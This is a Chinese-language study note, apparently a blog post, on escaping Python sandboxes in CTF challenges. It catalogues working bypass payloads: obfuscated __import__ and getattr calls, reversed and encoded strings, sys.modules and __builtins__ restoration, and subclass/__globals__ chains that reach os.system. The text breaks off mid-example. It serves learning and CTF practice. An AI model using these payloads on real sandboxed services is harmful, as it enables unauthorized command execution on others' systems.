# python的沙箱逃逸
## 前言
就上次学习mako留下来的疑问，py的沙箱逃逸的学习，这篇记录一下python沙箱逃逸的学习吸收一下Tr0y佬的博客加上一些自己的理解，我的理解的python的沙箱逃逸说白了就是花式过滤绕过，吸收一些大佬的总结，积累一些ctf赛题中的新颖的逃逸方法，这块大概就可以吃透了
## 命令执行
### import过滤bypass
最无脑的过滤就是import os
    import  os
    import   os
    import    os
    。。。。
过滤了多个空格后，我们知道py中可不止一个`import`可以引用的
还有一下的方法
    __import__：__import__('os')
    importlib：importlib.import_module('os').system('ls')
或者根据import的原理:执行导入 库.py中的代码
可以用 `execfile` 来代替，不过这个方法是python2中特有的
    execfile('/usr/lib/python2.7/os.py')#引用库的路径
    system('ls')
python3和2通用的方法
    with open('/usr/lib/python3.6/os.py','r') as f:
        exec(f.read())
    system('ls')
对于这个库的路径，绝大多数情况下都是存在于默认路劲下的，最好还是再确认一下
    import sys
    print(sys.path)
如果sys被搬了就寄了
### 字符串过滤bypass
代码中要是出现 `os`，直接不让运行。那么可以利用字符串的各种变化来引入 os：
    __import__('so'[::-1]).system('ls')
或者
    b = 'o'
    a = 's'
    __import__(a+b).system('ls')
利用eval或者exec，结合字符串倒序
    eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
    exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
字符串的处理我们在flask中也说到了，那些逆序、拼接、base64、hex、rot13...等等，
    ['__builtins__'] 
    ['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'] 
    [u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'] 
    ['X19idWlsdGluc19f'.decode('base64')] 
    ['__buil'+'tins__'] 
    ['__buil''tins__'] 
    ['__buil'.__add__('tins__')] 
    ["_builtins_".join("__")] 
    ['%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]#最后这个第一次见，如果没有变态到过滤字母和数字就无敌的了
    ...
### 恢复`sys.modules`
`sys.modules`是一个字典，它里面储存了加载过的模板信息。当python刚启动时，所列出的模板就是解释器在启动的时候自动加载的模板。像`os`模块就是默认加载进来的，所以`sys.modules`就会储存`os`模板的信息。当我们不能直接引用`os`模块的时候我们就可以像这样`sys.modules["os"]`曲线救国。
但是如果将 `os`从`sys.modules` 中代替，`os`就彻底没法用了：
    >>> sys.modules['os'] = 'not allowed'
    >>> import os
    >>> os.system('ls')
    Traceback (most recent call last):
      File "", line 1, in 
    AttributeError: 'str' object has no attribute 'system'
    >>>
但是就防范而言，这里绝对不能是删除`sys.modules["os"]`
当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module
对象，并加载 A。
所以删了 `sys.modules['os']` 只会让 Python 重新加载一次 os。
所以说绕过方法就是
    sys.modules['os'] = 'not allowed' # oj 为你加的
    del sys.modules['os']
    import os
    os.system('ls')
### 执行函数bypass
单单引入os模块是不行的，我们还要考虑os里面的system被ban了，我们也不能通过`os.system`来执行命令，更狠的就是删除了system这个函数，我们可以寻找其他进行命令执行的函数
像popen
    print(os.popen('whoami').read()) 
    print(os.popen2('whoami').read()) # py2
    print(os.popen3('whoami').read()) # py2
    .。。。。。
其次，可以通过 `getattr` 拿到对象的方法、属性：
    import os
    getattr(os, 'metsys'[::-1])('whoami')
不让出现 import 也没事：
    getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')
一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱。关于 `__builtins__`，见下文。
与 `getattr` 相似的还有
`__getattr__`、`__getattribute__`，它们自己的区别就是`getattr`相当于`class.attr`，都是获取类属性/方法的一种方式，在获取的时候会触发`__getattribute__`，如果`__getattribute__`找不到，则触发`__getattr__`，还找不到则报错。
### builtins、`__builtin__`与`__builtins__`
python中有的函数不需要import就可以使用，这就是python的内建模块，它有一些常用函数，变量，以及类。
在 2.x 版本中，内建模块被命名为 `__builtin__`，到了 3.x 就成了 `builtins`。它们都需要 import 才能查看：
py2
    import __builtin__
     __builtin__
    #
py3
    import builtins
    builtins
    #
而`__builtins__`是两者都有的，不需要导入 ,`__builtins__`实际上是前两者的引用，或者说是结合，不过还是有区别的
`__builtins__` 相对实用一点，并且在 `__builtins__`里有很多好东西：
    >>> '__import__' in dir(__builtins__)
    True
    >>> __builtins__.__dict__['__import__']('os').system('whoami')
    macr0phag3
    0
    >>> 'eval' in dir(__builtins__)
    True
    >>> 'execfile' in dir(__builtins__)
    True
`x.__dict__` ：它是 x 内部所有属性名和属性值组成的字典，有以下特点：
  1. 内置的数据类型没有 `__dict__` 属性
  2. 每个类有自己的 `__dict__` 属性，就算存着继承关系，父类的 `__dict__` 并不会影响子类的 `__dict__`
  3. 对象也有自己的 `__dict__` 属性，包含 `self.xxx` 这种实例属性
当赛题中`__builtins__`的危险函数，被代替或者删除
    __builtins__.__dict__['eval'] = 'not allowed'
    del __builtins__.__dict__['eval']
我们可以利用reload(`__builtins__`)进行恢复，但是reload也是在`__builtins__`，
reload被删除了就可以用另一种方法，还有一种情况是利用 `exec command in _global`
动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。
这里注意，2.x 的 `reload` 是内建的，3.x 需要 `import imp`，然后再 `imp.reload`。你看，reload 的参数是
`module`，所以肯定还能用于重新载入其他模块，这个放在下面说。
### 通过继承关系逃逸
具体可以参考jiajn2的ssti，具体思路是大相径庭的，也是通过一系列的子类继承，找到我们想要的子类，进行命令执行，甚至绕过方法都可以参考jiajn2的ssti
这里也只是记录一些之前没有提到过的
**思路：**
我们可以找到一些某个库中包含的os这个模板，我们就不用直接对os进行使用，列入site这个库里面就有os
    import site
    >>> site.os
    #
那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 `import site`。可以利用
`reload`，变相加载 `os`：
    >>> import site
    >>> os
    Traceback (most recent call last):
      File "", line 1, in 
    NameError: name 'os' is not defined
    >>> os = reload(site.os)
    >>> os.system('whoami')
    macr0phag3
还有，既然所有的类都继承的`object`，那么我们先用`__subclasses__`看看它的子类，以 2.x 为例：
    >>> for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
    一大堆子类
可以看到，site 就在里面，以 2.x 的`site._Printer`为例（py3.x 中已经移除了这里 `__globals__` 的 `os`）：
    >>> ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os']
    >>> # 为了避免 index 位置问题，可以这样写：
    >>> [i._Printer__setup.__globals__['os'] for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_Printer"]
    PROLOG
os 又回来了。并且 site 中还有 `__builtins__`。
这个方法不仅限于 A->os，还阔以是 A->B->os，比如 2.x 中的 `warnings`：
    >>> import warnings
    >>> 
    >>> warnings.os
    Traceback (most recent call last):
      File "", line 1, in 
    AttributeError: 'module' object has no attribute 'os'
    >>> 
    >>> warnings.linecache
    >>>
    >>> warnings.linecache.os
在继承链中就可以这样（py3.x 中已经移除了这里 `__globals__` 的 `linecache`）：
    >>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')
    macr0phag3
    0
    >>> # 为了避免 index 位置问题，可以这样写：
    >>> [i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "catch_warnings"]
    ps：这种构造方法值得学，这样就不用跑脚本确认子类位置了
所以通过`_module`也可以构造 payload（py3.x 中已经移除了 `catch_warnings` 的 `linecache`）：
    >>> [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.linecache.os.system('whoami')
3.x 中的`warnings`虽然没有 `linecache`，也有`__builtins__`。
**`__call__`方法：**
具体来说是利用`builtin_function_or_method` 的 `__call__`
    "".__class__.__mro__[-1].__subclasses__()[29].__call__(eval, '1+1')
**利用异常逃逸**
    hack = lambda : [0][1]
    try:
        hack()
    except Exception as e: